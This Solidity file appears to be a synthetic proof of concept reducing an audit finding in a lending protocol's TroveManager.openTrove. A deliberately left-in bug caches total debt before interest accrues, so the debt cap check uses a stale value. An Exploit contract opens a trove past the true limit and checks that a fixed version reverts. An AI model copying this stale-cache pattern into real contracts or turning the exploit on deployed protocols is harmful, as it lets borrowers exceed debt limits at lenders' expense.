// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Roots TroveManager.openTrove — stale totalActiveDebt (Pashov, 55112)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: supply caches totalActiveDebt before _accrueActiveInterests.
    The later write uses that cache, so the interest accrued in the same call
    is dropped. A trove that the true debt would reject still opens. */

contract MockERC20 {
    string public name = "Debt";
    string public symbol = "DEBT";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TroveManager {
    uint256 public totalActiveDebt = 1000;
    uint256 public pendingInterest = 100;
    uint256 public maxSystemDebt = 1599;
    uint256 public defaultedDebt;
    MockERC20 public debtToken;
    bool public immutable useFreshSupply;

    constructor(MockERC20 t, bool fresh) {
        debtToken = t;
        useFreshSupply = fresh;
    }

    function openTrove(uint256 compositeDebt) external returns (uint256 written) {
        uint256 supply = totalActiveDebt;
        _accrueActiveInterests();
        uint256 base = useFreshSupply ? totalActiveDebt : supply;
        // @> VULN: base is the pre-interest cache, so this sum drops the 100 interest
        uint256 _newTotalDebt = base + compositeDebt;
        require(_newTotalDebt + defaultedDebt <= maxSystemDebt, "Collateral debt limit reached");
        totalActiveDebt = _newTotalDebt;
        debtToken.transfer(msg.sender, compositeDebt);
        written = _newTotalDebt;
    }

    function _accrueActiveInterests() internal {
        uint256 activeInterests = pendingInterest;
        pendingInterest = 0;
        totalActiveDebt = totalActiveDebt + activeInterests;
    }
}

contract Exploit {
    uint256 public constant COMPOSITE = 500;
    uint256 public constant FAIR_DEBT = 1600;

    MockERC20 public debt; // nonce 1
    TroveManager public mgr; // nonce 2
    TroveManager public fresh; // nonce 3

    uint256 public wrongDebt;
    uint256 public borrowed;
    bool public fairOpenReverted;

    constructor() {
        debt = new MockERC20();
        mgr = new TroveManager(debt, false);
        fresh = new TroveManager(debt, true);
        debt.mint(address(mgr), COMPOSITE);
        debt.mint(address(fresh), COMPOSITE);
    }

    function run() external {
        wrongDebt = mgr.openTrove(COMPOSITE);
        borrowed = debt.balanceOf(address(this));
        require(wrongDebt == 1500, "wrong debt");
        require(mgr.totalActiveDebt() == 1500, "stored");
        require(borrowed == COMPOSITE, "borrowed");
        require(FAIR_DEBT == 1000 + 100 + COMPOSITE, "fair");
        require(wrongDebt + 100 == FAIR_DEBT, "short 100");

        try fresh.openTrove(COMPOSITE) returns (uint256) {
            revert("fair open succeeded");
        } catch {
            fairOpenReverted = true;
        }
        require(fairOpenReverted, "not blocked");
        require(fresh.totalActiveDebt() == 1000, "fresh rolled back");
        require(debt.balanceOf(address(fresh)) == COMPOSITE, "control paid nothing");
    }
}
